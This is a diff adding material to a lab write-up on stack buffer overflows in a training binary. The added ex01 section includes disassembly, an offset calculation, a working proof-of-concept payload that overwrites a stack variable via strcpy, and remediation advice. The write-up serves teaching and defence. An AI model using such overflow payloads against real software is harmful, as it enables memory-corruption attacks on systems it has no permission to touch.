@@ -162,6 +162,14 @@ user@hole-in-bin:/opt/hole-in-bin/ex00$
 
 The 64-byte padding fills the space between the start of the buffer and the `modified` variable. The subsequent non-zero byte (`B`) overwrites `modified`, satisfying the validation check (`test eax, eax`) and triggering the success message.
 
+
+#### Key Takeaway
+
+This challenge demonstrates how an unchecked memory write can overwrite
+a neighboring stack variable. The vulnerability can be analyzed by
+understanding the stack layout and calculating the distance between
+the input buffer and the target variable.
+
 ---
 
 #### Remediation
@@ -169,4 +177,117 @@ The 64-byte padding fills the space between the start of the buffer and the `mod
 1. **Use Bounded Functions:** Replace the unsafe `gets()` function with a safe input function:
 ```c
 fgets(buffer, sizeof(buffer), stdin);
+```
+---
+
+## ex01 - Stack Buffer Overflow
+
+#### Objective
+
+Modify the `modified` variable to hold the specific hexadecimal value:
+
+```bash
+0x61626364
+```
+
+The challenge is successfully completed when the program outputs:
+
+> `you have correctly got the variable to the right value`
+
+---
+
+#### Analysis
+
+Analyzing the `main` function disassembly using **GDB/PEDA**:
+
+```assembly
+gdb-peda$ pd main
+
+0x08048464 <+0>:     push   ebp
+0x08048465 <+1>:     mov    ebp,esp
+0x08048467 <+3>:     and    esp,0xfffffff0
+0x0804846a <+6>:     sub    esp,0x60
+
+0x0804846d <+9>:     cmp    DWORD PTR [ebp+0x8],0x1
+0x08048471 <+13>:    jne    0x8048487 <main+35>
+
+0x08048487 <+35>:    mov    DWORD PTR [esp+0x5c],0x0
+
+0x0804848f <+43>:    mov    eax,DWORD PTR [ebp+0xc]
+0x08048492 <+46>:    add    eax,0x4
+0x08048495 <+49>:    mov    eax,DWORD PTR [eax]
+
+0x08048497 <+51>:    mov    DWORD PTR [esp+0x4],eax
+0x0804849b <+55>:    lea    eax,[esp+0x1c]
+0x0804849f <+59>:    mov    DWORD PTR [esp],eax
+0x080484a2 <+62>:    call   0x8048368 <strcpy@plt>
+
+0x080484a7 <+67>:    mov    eax,DWORD PTR [esp+0x5c]
+0x080484ab <+71>:    cmp    eax,0x61626364
+```
+
+**Stack Layout Observations:**
+
+* Destination buffer start: `esp + 0x1c`
+* Target variable (`modified`) location: `esp + 0x5c`
+
+**Offset Calculation:**
+
+```text
+0x5c - 0x1c = 0x40 = 64 bytes
+```
+
+---
+
+#### Vulnerability
+
+The application uses `strcpy()` (`call 0x8048368 <strcpy@plt>`) to copy user input from `argv[1]` into the fixed-size buffer at `esp + 0x1c`. Because `strcpy()` performs no length validation, supplying a string longer than 64 bytes overflows the destination buffer and directly overwrites the adjacent `modified` variable on the stack.
+
+---
+
+#### Exploitation
+
+**Target Value:** `0x61626364`
+
+Because the binary runs on an x86 architecture (**Little-Endian** byte ordering), the bytes must be supplied in reverse order:
+
+```text
+\x64 \x63 \x62 \x61  --->  "dcba"
+```
+
+**Payload Structure:**
+
+```text
+[ 64 Bytes Padding ] + [ "dcba" ]
+```
+
+**Proof of Concept (PoC):**
+
+```bash
+./bin $(python -c 'print "A" * 64 + "dcba"') 
+```
+
+**Result:**
+
+```text
+    you have correctly got the variable to the right value
+```
+
+The first 64 bytes pad the space from the start of the buffer up to `modified`. The trailing `"dcba"` overwrites `modified` with `0x61626364`, satisfying the comparison check (`cmp eax, 0x61626364`).
+
+
+#### Key Takeaway
+
+This challenge demonstrates how a stack buffer overflow can be used
+to overwrite a variable with a specific value. The required value must
+be represented according to the target architecture's byte ordering.
+
+
+---
+
+#### Remediation
+
+ **Avoid Unsafe Copy Operations:** Replace `strcpy()` with bounded functions that enforce destination buffer limits, such as `strncpy()` or `snprintf()`:
+```c
+snprintf(buffer, sizeof(buffer), "%s", input);
 ```
